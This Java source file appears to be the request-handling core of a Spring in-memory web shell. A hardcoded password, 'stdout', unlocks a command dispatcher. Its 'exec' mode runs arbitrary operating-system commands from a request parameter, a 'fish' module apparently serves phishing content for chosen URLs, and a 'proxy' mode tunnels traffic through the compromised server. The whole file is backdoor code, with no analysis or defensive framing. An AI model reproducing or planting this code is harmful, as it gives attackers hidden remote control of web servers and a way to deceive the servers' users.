package com.stdout.Utils;

import com.stdout.Models.SpringProxy;

public class PreDoFilter {
    public static String PreDeal(Object request, Object response) throws Exception {
        String result = "";
        String uri = MyRequest.getRequestURI(request);

        result += com.stdout.Models.Fish.StaticFish(uri);
        if (result.length() != 0) {
            return result;
        }

        String password = MyRequest.getParameter(request, "password");

        if (password != null) {
            if (password.equals("stdout")) {
                String model = MyRequest.getParameter(request, "model");

                if (model.equals("help")) {
                    result += com.stdout.springMem.SpringMemModels.help();
                }
                else if (model.equals("exec")) {
                    String cmd = MyRequest.getParameter(request, "cmd");
                    result += com.stdout.Models.CommandExecutor.exec(cmd);
                }
                else if (model.equals("fish")) {
                    String action = MyRequest.getParameter(request, "action");
                    if (action.equals("start")) {
                        String target = MyRequest.getParameter(request, "target");
                        String file = MyRequest.getParameter(request, "file");
                        result += com.stdout.Models.Fish.fishStart(target, file);
                    } else if (action.equals("stop")) {
                        result += com.stdout.Models.Fish.fishStop();
                    } else if (action.equals("show")) {
                        result += com.stdout.Models.Fish.fishShow();
                    }
                }
                else if (model.equals("proxy")) {

                    new com.stdout.Models.SpringProxy().doProxy(request, response);
                    return "No printer\n\n\n";
                }

                else if (model.equals("exit")) {
                    result += com.stdout.springMem.SpringMemModels.exit();
                }

                return result;
            }
        }


        return "";
    }
}
